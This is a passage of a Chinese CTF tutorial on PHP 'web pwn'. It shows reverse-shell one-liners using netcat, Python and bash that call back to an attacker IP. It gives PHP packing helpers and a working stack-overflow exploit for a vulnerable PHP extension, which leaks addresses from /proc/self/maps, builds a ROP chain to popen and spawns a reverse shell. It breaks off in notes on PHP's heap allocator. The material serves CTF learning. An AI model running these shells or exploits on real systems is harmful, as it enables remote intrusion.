+<li>在目标机器上执行命令，使其连接回攻击者的机器。</li>
+<li>连接建立后，将目标机器的 shell 重定向到该连接。</li>
+</ol>
+<p>示例：</p>
+<ol>
+<li>使用 netcat（nc）的示例：</li>
+</ol>
+<p>攻击者机器（IP：10.0.0.1）：</p>
+<pre><code>nc -lvp 4444
+</code></pre>
+<p>该命令在 4444 端口监听传入连接。</p>
+<p>目标机器：</p>
+<pre><code>nc 10.0.0.1 4444 -e /bin/bash
+</code></pre>
+<p>该命令连接到攻击者机器，并执行 bash shell。</p>
+<ol start="2">
+<li>使用 Python 的示例：</li>
+</ol>
+<p>攻击者机器（IP：10.0.0.1）：</p>
+<pre><code>nc -lvp 4444
+</code></pre>
+<p>目标机器：</p>
+<pre><code class="language-python">import socket,subprocess,os
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect((&quot;10.0.0.1&quot;,4444))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;])
+</code></pre>
+<ol start="3">
+<li>使用 Bash 的示例：</li>
+</ol>
+<p>攻击者机器（IP：10.0.0.1）：</p>
+<pre><code>nc -lvp 4444
+</code></pre>
+<p>目标机器：</p>
+<pre><code class="language-bash">bash -i &gt;&amp; /dev/tcp/10.0.0.1/4444 0&gt;&amp;1
+</code></pre>
+<p>这些示例都会在目标机器上创建 shell，并将其输入输出重定向到攻击者机器。</p>
+<h1 id="常用-php">常用 PHP</h1>
+<pre><code class="language-php">//零字节
+&quot;\x00&quot;
+//等价于p64
+pack(&#39;Q&#39;, $p_rdi_r)
+//等价于&#39;a&#39;*0x80
+str_repeat(&#39;a&#39;, 0x80);
+//等价于command.ljust(0x60,&quot;\x00&quot;)
+str_pad($command, 0x60, &quot;\x00&quot;)
+//等价于p64
+function p64(string $value):string{
+    static $p64_table=[
+        0=&gt;&quot;\x00&quot;,1=&gt;&quot;\x01&quot;,2=&gt;&quot;\x02&quot;,3=&gt;&quot;\x03&quot;,4=&gt;&quot;\x04&quot;,5=&gt;&quot;\x05&quot;,6=&gt;&quot;\x06&quot;,7=&gt;&quot;\x07&quot;,8=&gt;&quot;\x08&quot;,9=&gt;&quot;\x09&quot;,10=&gt;&quot;\x0a&quot;,
+        11=&gt;&quot;\x0b&quot;,12=&gt;&quot;\x0c&quot;,13=&gt;&quot;\x0d&quot;,14=&gt;&quot;\x0e&quot;,15=&gt;&quot;\x0f&quot;,16=&gt;&quot;\x10&quot;,17=&gt;&quot;\x11&quot;,18=&gt;&quot;\x12&quot;,19=&gt;&quot;\x13&quot;,20=&gt;&quot;\x14&quot;,
+        21=&gt;&quot;\x15&quot;,22=&gt;&quot;\x16&quot;,23=&gt;&quot;\x17&quot;,24=&gt;&quot;\x18&quot;,25=&gt;&quot;\x19&quot;,26=&gt;&quot;\x1a&quot;,27=&gt;&quot;\x1b&quot;,28=&gt;&quot;\x1c&quot;,29=&gt;&quot;\x1d&quot;,30=&gt;&quot;\x1e&quot;,
+        31=&gt;&quot;\x1f&quot;,32=&gt;&quot;\x20&quot;,33=&gt;&quot;\x21&quot;,34=&gt;&quot;\x22&quot;,35=&gt;&quot;\x23&quot;,36=&gt;&quot;\x24&quot;,37=&gt;&quot;\x25&quot;,38=&gt;&quot;\x26&quot;,39=&gt;&quot;\x27&quot;,40=&gt;&quot;\x28&quot;,
+        41=&gt;&quot;\x29&quot;,42=&gt;&quot;\x2a&quot;,43=&gt;&quot;\x2b&quot;,44=&gt;&quot;\x2c&quot;,45=&gt;&quot;\x2d&quot;,46=&gt;&quot;\x2e&quot;,47=&gt;&quot;\x2f&quot;,48=&gt;&quot;\x30&quot;,49=&gt;&quot;\x31&quot;,50=&gt;&quot;\x32&quot;,
+        51=&gt;&quot;\x33&quot;,52=&gt;&quot;\x34&quot;,53=&gt;&quot;\x35&quot;,54=&gt;&quot;\x36&quot;,55=&gt;&quot;\x37&quot;,56=&gt;&quot;\x38&quot;,57=&gt;&quot;\x39&quot;,58=&gt;&quot;\x3a&quot;,59=&gt;&quot;\x3b&quot;,60=&gt;&quot;\x3c&quot;,
+        61=&gt;&quot;\x3d&quot;,62=&gt;&quot;\x3e&quot;,63=&gt;&quot;\x3f&quot;,64=&gt;&quot;\x40&quot;,65=&gt;&quot;\x41&quot;,66=&gt;&quot;\x42&quot;,67=&gt;&quot;\x43&quot;,68=&gt;&quot;\x44&quot;,69=&gt;&quot;\x45&quot;,70=&gt;&quot;\x46&quot;,
+        71=&gt;&quot;\x47&quot;,72=&gt;&quot;\x48&quot;,73=&gt;&quot;\x49&quot;,74=&gt;&quot;\x4a&quot;,75=&gt;&quot;\x4b&quot;,76=&gt;&quot;\x4c&quot;,77=&gt;&quot;\x4d&quot;,78=&gt;&quot;\x4e&quot;,79=&gt;&quot;\x4f&quot;,80=&gt;&quot;\x50&quot;,
+        81=&gt;&quot;\x51&quot;,82=&gt;&quot;\x52&quot;,83=&gt;&quot;\x53&quot;,84=&gt;&quot;\x54&quot;,85=&gt;&quot;\x55&quot;,86=&gt;&quot;\x56&quot;,87=&gt;&quot;\x57&quot;,88=&gt;&quot;\x58&quot;,89=&gt;&quot;\x59&quot;,90=&gt;&quot;\x5a&quot;,
+        91=&gt;&quot;\x5b&quot;,92=&gt;&quot;\x5c&quot;,93=&gt;&quot;\x5d&quot;,94=&gt;&quot;\x5e&quot;,95=&gt;&quot;\x5f&quot;,96=&gt;&quot;\x60&quot;,97=&gt;&quot;\x61&quot;,98=&gt;&quot;\x62&quot;,99=&gt;&quot;\x63&quot;,100=&gt;&quot;\x64&quot;,
+        101=&gt;&quot;\x65&quot;,102=&gt;&quot;\x66&quot;,103=&gt;&quot;\x67&quot;,104=&gt;&quot;\x68&quot;,105=&gt;&quot;\x69&quot;,106=&gt;&quot;\x6a&quot;,107=&gt;&quot;\x6b&quot;,108=&gt;&quot;\x6c&quot;,109=&gt;&quot;\x6d&quot;,110=&gt;&quot;\x6e&quot;,
+        111=&gt;&quot;\x6f&quot;,112=&gt;&quot;\x70&quot;,113=&gt;&quot;\x71&quot;,114=&gt;&quot;\x72&quot;,115=&gt;&quot;\x73&quot;,116=&gt;&quot;\x74&quot;,117=&gt;&quot;\x75&quot;,118=&gt;&quot;\x76&quot;,119=&gt;&quot;\x77&quot;,120=&gt;&quot;\x78&quot;,
+        121=&gt;&quot;\x79&quot;,122=&gt;&quot;\x7a&quot;,123=&gt;&quot;\x7b&quot;,124=&gt;&quot;\x7c&quot;,125=&gt;&quot;\x7d&quot;,126=&gt;&quot;\x7e&quot;,127=&gt;&quot;\x7f&quot;,128=&gt;&quot;\x80&quot;,129=&gt;&quot;\x81&quot;,130=&gt;&quot;\x82&quot;,
+        131=&gt;&quot;\x83&quot;,132=&gt;&quot;\x84&quot;,133=&gt;&quot;\x85&quot;,134=&gt;&quot;\x86&quot;,135=&gt;&quot;\x87&quot;,136=&gt;&quot;\x88&quot;,137=&gt;&quot;\x89&quot;,138=&gt;&quot;\x8a&quot;,139=&gt;&quot;\x8b&quot;,140=&gt;&quot;\x8c&quot;,
+        141=&gt;&quot;\x8d&quot;,142=&gt;&quot;\x8e&quot;,143=&gt;&quot;\x8f&quot;,144=&gt;&quot;\x90&quot;,145=&gt;&quot;\x91&quot;,146=&gt;&quot;\x92&quot;,147=&gt;&quot;\x93&quot;,148=&gt;&quot;\x94&quot;,149=&gt;&quot;\x95&quot;,150=&gt;&quot;\x96&quot;,
+        151=&gt;&quot;\x97&quot;,152=&gt;&quot;\x98&quot;,153=&gt;&quot;\x99&quot;,154=&gt;&quot;\x9a&quot;,155=&gt;&quot;\x9b&quot;,156=&gt;&quot;\x9c&quot;,157=&gt;&quot;\x9d&quot;,158=&gt;&quot;\x9e&quot;,159=&gt;&quot;\x9f&quot;,160=&gt;&quot;\xa0&quot;,
+        161=&gt;&quot;\xa1&quot;,162=&gt;&quot;\xa2&quot;,163=&gt;&quot;\xa3&quot;,164=&gt;&quot;\xa4&quot;,165=&gt;&quot;\xa5&quot;,166=&gt;&quot;\xa6&quot;,167=&gt;&quot;\xa7&quot;,168=&gt;&quot;\xa8&quot;,169=&gt;&quot;\xa9&quot;,170=&gt;&quot;\xaa&quot;,
+        171=&gt;&quot;\xab&quot;,172=&gt;&quot;\xac&quot;,173=&gt;&quot;\xad&quot;,174=&gt;&quot;\xae&quot;,175=&gt;&quot;\xaf&quot;,176=&gt;&quot;\xb0&quot;,177=&gt;&quot;\xb1&quot;,178=&gt;&quot;\xb2&quot;,179=&gt;&quot;\xb3&quot;,180=&gt;&quot;\xb4&quot;,
+        181=&gt;&quot;\xb5&quot;,182=&gt;&quot;\xb6&quot;,183=&gt;&quot;\xb7&quot;,184=&gt;&quot;\xb8&quot;,185=&gt;&quot;\xb9&quot;,186=&gt;&quot;\xba&quot;,187=&gt;&quot;\xbb&quot;,188=&gt;&quot;\xbc&quot;,189=&gt;&quot;\xbd&quot;,190=&gt;&quot;\xbe&quot;,
+        191=&gt;&quot;\xbf&quot;,192=&gt;&quot;\xc0&quot;,193=&gt;&quot;\xc1&quot;,194=&gt;&quot;\xc2&quot;,195=&gt;&quot;\xc3&quot;,196=&gt;&quot;\xc4&quot;,197=&gt;&quot;\xc5&quot;,198=&gt;&quot;\xc6&quot;,199=&gt;&quot;\xc7&quot;,200=&gt;&quot;\xc8&quot;,
+        201=&gt;&quot;\xc9&quot;,202=&gt;&quot;\xca&quot;,203=&gt;&quot;\xcb&quot;,204=&gt;&quot;\xcc&quot;,205=&gt;&quot;\xcd&quot;,206=&gt;&quot;\xce&quot;,207=&gt;&quot;\xcf&quot;,208=&gt;&quot;\xd0&quot;,209=&gt;&quot;\xd1&quot;,210=&gt;&quot;\xd2&quot;,
+        211=&gt;&quot;\xd3&quot;,212=&gt;&quot;\xd4&quot;,213=&gt;&quot;\xd5&quot;,214=&gt;&quot;\xd6&quot;,215=&gt;&quot;\xd7&quot;,216=&gt;&quot;\xd8&quot;,217=&gt;&quot;\xd9&quot;,218=&gt;&quot;\xda&quot;,219=&gt;&quot;\xdb&quot;,220=&gt;&quot;\xdc&quot;,
+        221=&gt;&quot;\xdd&quot;,222=&gt;&quot;\xde&quot;,223=&gt;&quot;\xdf&quot;,224=&gt;&quot;\xe0&quot;,225=&gt;&quot;\xe1&quot;,226=&gt;&quot;\xe2&quot;,227=&gt;&quot;\xe3&quot;,228=&gt;&quot;\xe4&quot;,229=&gt;&quot;\xe5&quot;,230=&gt;&quot;\xe6&quot;,
+        231=&gt;&quot;\xe7&quot;,232=&gt;&quot;\xe8&quot;,233=&gt;&quot;\xe9&quot;,234=&gt;&quot;\xea&quot;,235=&gt;&quot;\xeb&quot;,236=&gt;&quot;\xec&quot;,237=&gt;&quot;\xed&quot;,238=&gt;&quot;\xee&quot;,239=&gt;&quot;\xef&quot;,240=&gt;&quot;\xf0&quot;,
+        241=&gt;&quot;\xf1&quot;,242=&gt;&quot;\xf2&quot;,243=&gt;&quot;\xf3&quot;,244=&gt;&quot;\xf4&quot;,245=&gt;&quot;\xf5&quot;,246=&gt;&quot;\xf6&quot;,247=&gt;&quot;\xf7&quot;,248=&gt;&quot;\xf8&quot;,249=&gt;&quot;\xf9&quot;,250=&gt;&quot;\xfa&quot;,
+        251=&gt;&quot;\xfb&quot;,252=&gt;&quot;\xfc&quot;,253=&gt;&quot;\xfd&quot;,254=&gt;&quot;\xfe&quot;,255=&gt;&quot;\xff&quot;
+    ];
+    $result = &quot;&quot;;
+    for($i = 0; $i &lt; 8; $i++){
+        $remainder = $value % 0x100;
+        $value =  (int)($value/0x100);
+        $result .= $p64_table[$remainder];
+    }
+    return $result;
+}
+//等价于u64
+function u64(string $bytes):int{
+    static $u64_table=[
+        &quot;\x00&quot;=&gt;0,&quot;\x01&quot;=&gt;1,&quot;\x02&quot;=&gt;2,&quot;\x03&quot;=&gt;3,&quot;\x04&quot;=&gt;4,&quot;\x05&quot;=&gt;5,&quot;\x06&quot;=&gt;6,&quot;\x07&quot;=&gt;7,&quot;\x08&quot;=&gt;8,&quot;\x09&quot;=&gt;9,&quot;\x0a&quot;=&gt;10,
+        &quot;\x0b&quot;=&gt;11,&quot;\x0c&quot;=&gt;12,&quot;\x0d&quot;=&gt;13,&quot;\x0e&quot;=&gt;14,&quot;\x0f&quot;=&gt;15,&quot;\x10&quot;=&gt;16,&quot;\x11&quot;=&gt;17,&quot;\x12&quot;=&gt;18,&quot;\x13&quot;=&gt;19,&quot;\x14&quot;=&gt;20,
+        &quot;\x15&quot;=&gt;21,&quot;\x16&quot;=&gt;22,&quot;\x17&quot;=&gt;23,&quot;\x18&quot;=&gt;24,&quot;\x19&quot;=&gt;25,&quot;\x1a&quot;=&gt;26,&quot;\x1b&quot;=&gt;27,&quot;\x1c&quot;=&gt;28,&quot;\x1d&quot;=&gt;29,&quot;\x1e&quot;=&gt;30,
+        &quot;\x1f&quot;=&gt;31,&quot;\x20&quot;=&gt;32,&quot;\x21&quot;=&gt;33,&quot;\x22&quot;=&gt;34,&quot;\x23&quot;=&gt;35,&quot;\x24&quot;=&gt;36,&quot;\x25&quot;=&gt;37,&quot;\x26&quot;=&gt;38,&quot;\x27&quot;=&gt;39,&quot;\x28&quot;=&gt;40,
+        &quot;\x29&quot;=&gt;41,&quot;\x2a&quot;=&gt;42,&quot;\x2b&quot;=&gt;43,&quot;\x2c&quot;=&gt;44,&quot;\x2d&quot;=&gt;45,&quot;\x2e&quot;=&gt;46,&quot;\x2f&quot;=&gt;47,&quot;\x30&quot;=&gt;48,&quot;\x31&quot;=&gt;49,&quot;\x32&quot;=&gt;50,
+        &quot;\x33&quot;=&gt;51,&quot;\x34&quot;=&gt;52,&quot;\x35&quot;=&gt;53,&quot;\x36&quot;=&gt;54,&quot;\x37&quot;=&gt;55,&quot;\x38&quot;=&gt;56,&quot;\x39&quot;=&gt;57,&quot;\x3a&quot;=&gt;58,&quot;\x3b&quot;=&gt;59,&quot;\x3c&quot;=&gt;60,
+        &quot;\x3d&quot;=&gt;61,&quot;\x3e&quot;=&gt;62,&quot;\x3f&quot;=&gt;63,&quot;\x40&quot;=&gt;64,&quot;\x41&quot;=&gt;65,&quot;\x42&quot;=&gt;66,&quot;\x43&quot;=&gt;67,&quot;\x44&quot;=&gt;68,&quot;\x45&quot;=&gt;69,&quot;\x46&quot;=&gt;70,
+        &quot;\x47&quot;=&gt;71,&quot;\x48&quot;=&gt;72,&quot;\x49&quot;=&gt;73,&quot;\x4a&quot;=&gt;74,&quot;\x4b&quot;=&gt;75,&quot;\x4c&quot;=&gt;76,&quot;\x4d&quot;=&gt;77,&quot;\x4e&quot;=&gt;78,&quot;\x4f&quot;=&gt;79,&quot;\x50&quot;=&gt;80,
+        &quot;\x51&quot;=&gt;81,&quot;\x52&quot;=&gt;82,&quot;\x53&quot;=&gt;83,&quot;\x54&quot;=&gt;84,&quot;\x55&quot;=&gt;85,&quot;\x56&quot;=&gt;86,&quot;\x57&quot;=&gt;87,&quot;\x58&quot;=&gt;88,&quot;\x59&quot;=&gt;89,&quot;\x5a&quot;=&gt;90,
+        &quot;\x5b&quot;=&gt;91,&quot;\x5c&quot;=&gt;92,&quot;\x5d&quot;=&gt;93,&quot;\x5e&quot;=&gt;94,&quot;\x5f&quot;=&gt;95,&quot;\x60&quot;=&gt;96,&quot;\x61&quot;=&gt;97,&quot;\x62&quot;=&gt;98,&quot;\x63&quot;=&gt;99,&quot;\x64&quot;=&gt;100,
+        &quot;\x65&quot;=&gt;101,&quot;\x66&quot;=&gt;102,&quot;\x67&quot;=&gt;103,&quot;\x68&quot;=&gt;104,&quot;\x69&quot;=&gt;105,&quot;\x6a&quot;=&gt;106,&quot;\x6b&quot;=&gt;107,&quot;\x6c&quot;=&gt;108,&quot;\x6d&quot;=&gt;109,&quot;\x6e&quot;=&gt;110,
+        &quot;\x6f&quot;=&gt;111,&quot;\x70&quot;=&gt;112,&quot;\x71&quot;=&gt;113,&quot;\x72&quot;=&gt;114,&quot;\x73&quot;=&gt;115,&quot;\x74&quot;=&gt;116,&quot;\x75&quot;=&gt;117,&quot;\x76&quot;=&gt;118,&quot;\x77&quot;=&gt;119,&quot;\x78&quot;=&gt;120,
+        &quot;\x79&quot;=&gt;121,&quot;\x7a&quot;=&gt;122,&quot;\x7b&quot;=&gt;123,&quot;\x7c&quot;=&gt;124,&quot;\x7d&quot;=&gt;125,&quot;\x7e&quot;=&gt;126,&quot;\x7f&quot;=&gt;127,&quot;\x80&quot;=&gt;128,&quot;\x81&quot;=&gt;129,&quot;\x82&quot;=&gt;130,
+        &quot;\x83&quot;=&gt;131,&quot;\x84&quot;=&gt;132,&quot;\x85&quot;=&gt;133,&quot;\x86&quot;=&gt;134,&quot;\x87&quot;=&gt;135,&quot;\x88&quot;=&gt;136,&quot;\x89&quot;=&gt;137,&quot;\x8a&quot;=&gt;138,&quot;\x8b&quot;=&gt;139,&quot;\x8c&quot;=&gt;140,
+        &quot;\x8d&quot;=&gt;141,&quot;\x8e&quot;=&gt;142,&quot;\x8f&quot;=&gt;143,&quot;\x90&quot;=&gt;144,&quot;\x91&quot;=&gt;145,&quot;\x92&quot;=&gt;146,&quot;\x93&quot;=&gt;147,&quot;\x94&quot;=&gt;148,&quot;\x95&quot;=&gt;149,&quot;\x96&quot;=&gt;150,
+        &quot;\x97&quot;=&gt;151,&quot;\x98&quot;=&gt;152,&quot;\x99&quot;=&gt;153,&quot;\x9a&quot;=&gt;154,&quot;\x9b&quot;=&gt;155,&quot;\x9c&quot;=&gt;156,&quot;\x9d&quot;=&gt;157,&quot;\x9e&quot;=&gt;158,&quot;\x9f&quot;=&gt;159,&quot;\xa0&quot;=&gt;160,
+        &quot;\xa1&quot;=&gt;161,&quot;\xa2&quot;=&gt;162,&quot;\xa3&quot;=&gt;163,&quot;\xa4&quot;=&gt;164,&quot;\xa5&quot;=&gt;165,&quot;\xa6&quot;=&gt;166,&quot;\xa7&quot;=&gt;167,&quot;\xa8&quot;=&gt;168,&quot;\xa9&quot;=&gt;169,&quot;\xaa&quot;=&gt;170,
+        &quot;\xab&quot;=&gt;171,&quot;\xac&quot;=&gt;172,&quot;\xad&quot;=&gt;173,&quot;\xae&quot;=&gt;174,&quot;\xaf&quot;=&gt;175,&quot;\xb0&quot;=&gt;176,&quot;\xb1&quot;=&gt;177,&quot;\xb2&quot;=&gt;178,&quot;\xb3&quot;=&gt;179,&quot;\xb4&quot;=&gt;180,
+        &quot;\xb5&quot;=&gt;181,&quot;\xb6&quot;=&gt;182,&quot;\xb7&quot;=&gt;183,&quot;\xb8&quot;=&gt;184,&quot;\xb9&quot;=&gt;185,&quot;\xba&quot;=&gt;186,&quot;\xbb&quot;=&gt;187,&quot;\xbc&quot;=&gt;188,&quot;\xbd&quot;=&gt;189,&quot;\xbe&quot;=&gt;190,
+        &quot;\xbf&quot;=&gt;191,&quot;\xc0&quot;=&gt;192,&quot;\xc1&quot;=&gt;193,&quot;\xc2&quot;=&gt;194,&quot;\xc3&quot;=&gt;195,&quot;\xc4&quot;=&gt;196,&quot;\xc5&quot;=&gt;197,&quot;\xc6&quot;=&gt;198,&quot;\xc7&quot;=&gt;199,&quot;\xc8&quot;=&gt;200,
+        &quot;\xc9&quot;=&gt;201,&quot;\xca&quot;=&gt;202,&quot;\xcb&quot;=&gt;203,&quot;\xcc&quot;=&gt;204,&quot;\xcd&quot;=&gt;205,&quot;\xce&quot;=&gt;206,&quot;\xcf&quot;=&gt;207,&quot;\xd0&quot;=&gt;208,&quot;\xd1&quot;=&gt;209,&quot;\xd2&quot;=&gt;210,
+        &quot;\xd3&quot;=&gt;211,&quot;\xd4&quot;=&gt;212,&quot;\xd5&quot;=&gt;213,&quot;\xd6&quot;=&gt;214,&quot;\xd7&quot;=&gt;215,&quot;\xd8&quot;=&gt;216,&quot;\xd9&quot;=&gt;217,&quot;\xda&quot;=&gt;218,&quot;\xdb&quot;=&gt;219,&quot;\xdc&quot;=&gt;220,
+        &quot;\xdd&quot;=&gt;221,&quot;\xde&quot;=&gt;222,&quot;\xdf&quot;=&gt;223,&quot;\xe0&quot;=&gt;224,&quot;\xe1&quot;=&gt;225,&quot;\xe2&quot;=&gt;226,&quot;\xe3&quot;=&gt;227,&quot;\xe4&quot;=&gt;228,&quot;\xe5&quot;=&gt;229,&quot;\xe6&quot;=&gt;230,
+        &quot;\xe7&quot;=&gt;231,&quot;\xe8&quot;=&gt;232,&quot;\xe9&quot;=&gt;233,&quot;\xea&quot;=&gt;234,&quot;\xeb&quot;=&gt;235,&quot;\xec&quot;=&gt;236,&quot;\xed&quot;=&gt;237,&quot;\xee&quot;=&gt;238,&quot;\xef&quot;=&gt;239,&quot;\xf0&quot;=&gt;240,
+        &quot;\xf1&quot;=&gt;241,&quot;\xf2&quot;=&gt;242,&quot;\xf3&quot;=&gt;243,&quot;\xf4&quot;=&gt;244,&quot;\xf5&quot;=&gt;245,&quot;\xf6&quot;=&gt;246,&quot;\xf7&quot;=&gt;247,&quot;\xf8&quot;=&gt;248,&quot;\xf9&quot;=&gt;249,&quot;\xfa&quot;=&gt;250,
+        &quot;\xfb&quot;=&gt;251,&quot;\xfc&quot;=&gt;252,&quot;\xfd&quot;=&gt;253,&quot;\xfe&quot;=&gt;254,&quot;\xff&quot;=&gt;255
+    ];
+    $result = 0;
+    for($i = 7; $i &gt;= 0; $i--){
+        $result = $u64_table[$bytes[$i]] + $result * 0x100;
+    }
+    return $result;
+}
+//变为64位的数字，这个仅限于打印string
+function hex64(int $value):string{
+    static $hex64_table=[
+        0=&gt;&quot;0&quot;,1=&gt;&quot;1&quot;,2=&gt;&quot;2&quot;,3=&gt;&quot;3&quot;,4=&gt;&quot;4&quot;,5=&gt;&quot;5&quot;,6=&gt;&quot;6&quot;,7=&gt;&quot;7&quot;,8=&gt;&quot;8&quot;,9=&gt;&quot;9&quot;,10=&gt;&quot;a&quot;,
+        11=&gt;&quot;b&quot;,12=&gt;&quot;c&quot;,13=&gt;&quot;d&quot;,14=&gt;&quot;e&quot;,15=&gt;&quot;f&quot;
+    ];
+    $result = &quot;&quot;;
+    for($i = 0; $i &lt; 16; $i++){
+        $remainder = $value % 0x10;
+        $value =  (int)($value/0x10);
+        $result = $hex64_table[$remainder] . $result;
+    }
+    return &quot;0x&quot; . $result;
+}
+//string to int
+function s2i($s) {
+    $result = 0;
+    for ($x = 0;$x &lt; strlen($s);$x++) {
+        $result &lt;&lt;= 8;
+        $result |= ord($s[$x]);
+    }
+    return $result;
+}
+//int to string，再进行read的时候肯定不能读入int，因此要转变为string
+function i2s($i, $x = 8) {
+    $re = &quot;&quot;;
+    for($j = 0;$j &lt; $x;$j++) {
+        $re .= chr($i &amp; 0xff);
+        $i &gt;&gt;= 8;
+    }
+    return $re;
+}
+</code></pre>
+<h1 id="栈溢出">栈溢出</h1>
+<p>与常规方法相同，只是泄露方式不同，可以直接通过 /proc/self/maps 泄露。</p>
+<h2 id="exp">exp</h2>
+<pre><code class="language-php">&lt;?php
+
+function i2s($i, $x = 8) {
+    $re = &quot;&quot;;
+    for($j = 0;$j &lt; $x;$j++) {
+        $re .= chr($i &amp; 0xff);
+        $i &gt;&gt;= 8;
+    }
+    return $re;
+}
+
+// 读取 /proc/self/maps 文件内容
+$content = file_get_contents(&#39;/proc/self/maps&#39;);
+echo $content ; //打印/proc/self/maps内容
+// 函数用于解析基地址
+function getBaseAddress($content, $pattern) {
+    if (preg_match_all($pattern, $content, $matches)) {
+        return $matches[1]; // 返回所有匹配的基地址
+    }
+    return null;
+}
+
+// 匹配 libc 的基地址
+$libcPattern = &#39;/^([0-9a-f]+)-[0-9a-f]+\\s+r--p\\s+.*?\\s+\\S*libc.*$/m&#39;;
+$libcBaseAddresses = getBaseAddress($content, $libcPattern);
+
+if ($libcBaseAddresses) {
+    echo &quot;libc base addresses:\n&quot;;
+    foreach ($libcBaseAddresses as $address) {
+        echo &quot;0x$address\n&quot;;
+        break;
+    }
+} else {
+    echo &quot;No libc base address found.\n&quot;;
+}
+
+// 匹配 stack 的基地址
+$stackPattern = &#39;/^([0-9a-f]+)-[0-9a-f]+\\s+rw-p\\s+.*?\\s+\\[stack\\]$/m&#39;;
+$stackBaseAddresses = getBaseAddress($content, $stackPattern);
+
+if ($stackBaseAddresses) {
+    echo &quot;stack base address:\n&quot;;
+    foreach ($stackBaseAddresses as $address) {
+        echo &quot;0x$address\n&quot;;
+        break;
+    }
+} else {
+    echo &quot;No stack base address found.\n&quot;;
+}
+
+// 定义地址和偏移量
+$libc_base= hexdec($libcBaseAddresses[0]);
+$stack_offset = 0x1c480;
+$stack_addr  = hexdec($stackBaseAddresses[0]);
+$p_rdi_r =  $libc_base+0x23b6a;//i2s(0x0000000000023b6a + $libc_base);
+echo &quot;$p_rdi_r\n&quot;;
+$p_rsi_r = 0x000000000002601f + $libc_base;
+$p_rdx_r = 0x000000000015fae6 + $libc_base; //0x000000000015fae6: pop rdx; pop rbx; ret; 
+$p_rax_r = 0x0000000000036174 + $libc_base;
+$ret = 0x0000000000036175 + $libc_base;
+// 获取 popen 地址
+$popen_addr = 0x84380 + $libc_base;
+
+// 定义命令
+$command = &#39;/bin/bash -c &quot;/bin/bash -i &gt;&amp;/dev/tcp/127.0.0.1/6666 0&gt;&amp;1&quot;&#39;;
+
+// 构造 payload
+$buf1 = str_repeat(&#39;a&#39;, 0x80);
+$buf = str_repeat(&#39;b&#39;, 0x8) . pack(&#39;Q&#39;, $p_rdi_r) . pack(&#39;Q&#39;, $stack_addr +$stack_offset ) ;
+$buf .= pack(&#39;Q&#39;, $p_rsi_r) . pack(&#39;Q&#39;, $stack_addr +$stack_offset-0x18); 
+$buf .= pack(&#39;Q&#39;, $ret); //balance stack rsp
+$buf .= pack(&#39;Q&#39;, $popen_addr) . &quot;r&quot; . str_repeat(&quot;\x00&quot;, 7) ;
+$buf = str_pad($buf, 0x50, &#39;c&#39;);
+$buf .= str_pad($command, 0x60, &quot;\x00&quot;) . str_repeat(&#39;\x00&#39;, 8);
+$payload = $buf1 . $buf;
+
+// 输出 payload，模拟 easy_phppwn(payload)
+
+echo $payload;
+easy_phppwn($payload)
+
+?&gt;
+</code></pre>
+<pre><code class="language-bash">llk@ubuntu:~/Desktop/tools/php-src/ext/hello/modules$ sudo nc -lvvp 6666 -n
+Listening on 0.0.0.0 6666
+</code></pre>
+<p>在 gdb 中：
+<img src="/workspace/endpoint-security/ctf-and-pwn/challenge-writeups/CTF-PWN%EF%BC%9AWeb%20Pwn%20%E5%85%A5%E9%97%A8/assets/csdn-141128519/image-014-4dc8c6b1bc.png" alt="图片">
+本地宿主机：
+<img src="/workspace/endpoint-security/ctf-and-pwn/challenge-writeups/CTF-PWN%EF%BC%9AWeb%20Pwn%20%E5%85%A5%E9%97%A8/assets/csdn-141128519/image-015-3843c1cdd8.png" alt="图片"></p>
+<h1 id="堆">堆</h1>
+<p><a href="https://hornos3.github.io/2024/07/01/PHP-pwn-%E5%AD%A6%E4%B9%A0-2/">https://hornos3.github.io/2024/07/01/PHP-pwn-%E5%AD%A6%E4%B9%A0-2/</a>
+<a href="https://xz.aliyun.com/t/15166?time__1311=GqjxuQi=DQ=0yRx%2bxCqiKTRDAr36eWqT4D#toc-1">https://xz.aliyun.com/t/15166?time__1311=GqjxuQi%3DDQ%3D0yRx%2BxCqiKTRDAr36eWqT4D#toc-1</a>
+<a href="https://deepunk.icu/php-pwn/#Payload">https://deepunk.icu/php-pwn/#Payload</a></p>
+<h2 id="php-堆源码">PHP 堆源码</h2>
+<p>zend_alloc 以 CHUNK 为单位向操作系统分配内存，每个 CHUNK 包含 2MB 内存。超过整个 chunk 大小的分配属于巨大分配（huge allocation），zend_alloc 使用 mmap 为其分配内存。ZendMM 中经常使用 PAGE 的概念，一页通常包含 4KB 内存，也就是说，一个 chunk 包含 512 页。小于页面大小 3/4 的分配属于小块分配（small allocation），其余则是大块分配（large allocation）。</p>
+<pre><code class="language-c">_emalloc-&gt;zend_mm_alloc_heap
+
+zend_mm_alloc_small
+ * Small - less than 3/4 of page size. Small sizes are rounded up to nearest
+ *         greater predefined small size (there are 30 predefined sizes:
+ *         8, 16, 24, 32, ... 3072). Small blocks are allocated from
+ *         RUNs. Each RUN is allocated as a single or few following pages.
+ *         Allocation inside RUNs implemented using linked list of free
+ *         elements. The result is aligned to 8 bytes.
+ 
+zend_mm_alloc_large
+ * Large - a number of 4096K pages inside a CHUNK. Large blocks
+ *         are always aligned on page boundary.
+
+zend_mm_alloc_huge
+ * Huge  - the size is greater than CHUNK size (~2M by default), allocation is
+ *         performed using mmap(). The result is aligned on 2M boundary.
+ 
+ 
+_efree-&gt;zend_mm_free_heap
+</code></pre>
+<p>_emalloc 是 PHP 自己实现的内存分配函数；默认情况下，PHP 不使用外部库（如 glibc）进行内存分配。</p>
+<pre><code class="language-c">// /Zend/zend_alloc.c, line 2534
+
+ZEND_API void* ZEND_FASTCALL _emalloc(size_t size ZEND_FILE_LINE_DC ZEND_FILE_LINE_ORIG_DC)
+{
+
+	if (UNEXPECTED(AG(mm_heap)-&gt;use_custom_heap)) {
+		return _malloc_custom(size ZEND_FILE_LINE_RELAY_CC ZEND_FILE_LINE_ORIG_RELAY_CC);
+	}
+
+	return zend_mm_alloc_heap(AG(mm_heap), size ZEND_FILE_LINE_RELAY_CC ZEND_FILE_LINE_ORIG_RELAY_CC);
+}
+</code></pre>
+<p>_malloc_custom 最终使用 glibc 库的 malloc 进行分配；通常使用 zend_mm_alloc_heap 分配。</p>
+<pre><code class="language-c">static ZEND_COLD void* ZEND_FASTCALL _malloc_custom(size_t size ZEND_FILE_LINE_DC ZEND_FILE_LINE_ORIG_DC)
+{
